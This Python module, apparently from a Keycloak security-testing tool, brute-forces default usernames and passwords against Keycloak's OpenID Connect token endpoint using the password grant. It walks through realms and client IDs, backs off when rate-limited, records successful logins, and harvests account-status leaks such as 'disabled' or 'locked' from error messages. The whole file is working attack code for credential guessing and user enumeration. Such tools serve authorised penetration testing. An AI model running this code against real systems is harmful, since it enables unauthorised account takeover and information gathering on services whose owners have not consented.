#!/usr/bin/env python3

from utils.utils import (
    requests,
    sys,
    time,
    args
)
from utils.style import Colors
from modules.defaultkeycloak import default_credentials


def test_invalid_credz():
    pass

def direct_access_grant_bf(s, realms, client_ids, rate_limit=0.1):
    print(f"{Colors.CYAN}   └── Direct Access Grant{Colors.RESET}")
    
    results = {
        "dag_enabled": [],
        "credentials": [],
        "user_info": []  # disabled, locked, etc.
    }
    
    for realm in realms:
        realm = realm.rstrip('/') + '/'
        url = f"{realm}protocol/openid-connect/token"
        
        for client_id in client_ids:
            dag_status = None
            
            for user, password in default_credentials:
                data = {
                    "grant_type": "password",
                    "client_id": client_id,
                    "username": user,
                    "password": password
                }
                
                try:
                    start = time.perf_counter()
                    req = s.post(url, data=data, allow_redirects=False, timeout=10)
                    elapsed = time.perf_counter() - start
                except Exception as e:
                    print(f"      {Colors.RED}[ERR] {e}{Colors.RESET}")
                    break
                
                # Rate limit détecté
                if req.status_code == 429 or elapsed > 3:
                    print(f"      {Colors.YELLOW}[!] Rate limit/slowdown on {client_id}{Colors.RESET}")
                    break
                
                # DAG désactivé
                if req.status_code == 400:
                    if "unauthorized_client" in req.text or "invalid_client" in req.text:
                        dag_status = False
                        break
                
                # DAG activé
                if dag_status is None:
                    dag_status = True
                    results["dag_enabled"].append(client_id)
                    print(f"      {Colors.GREEN}[DAG] {client_id}: Enabled{Colors.RESET}")
                
                # Parse error
                try:
                    resp_json = req.json()
                    error_desc = resp_json.get("error_description", "").lower()
                except:
                    error_desc = req.text.lower()
                
                # Success
                if req.status_code == 200:
                    results["credentials"].append({
                        "realm": realm, "client": client_id,
                        "user": user, "pass": password
                    })
                    print(f"      {Colors.GREEN}[+] {user}:{password} @ {client_id}{Colors.RESET}")
                
                # User info leak
                elif "disabled" in error_desc:
                    results["user_info"].append({"user": user, "status": "disabled"})
                    print(f"      {Colors.YELLOW}[i] {user}: disabled{Colors.RESET}")
                elif "locked" in error_desc or "temporarily" in error_desc:
                    results["user_info"].append({"user": user, "status": "locked"})
                    print(f"      {Colors.YELLOW}[i] {user}: locked{Colors.RESET}")
                
                time.sleep(rate_limit)
            
            if dag_status is False:
                print(f"      {Colors.THISTLE}[DAG] {client_id}: Disabled{Colors.RESET}")
    
    return results





def bf_credz(url, s, realms, client_ids):
    print(f"{Colors.CYAN} ├ Credentials analysis {Colors.RESET}")
    direct_access_grant_bf(s, realms, client_ids)
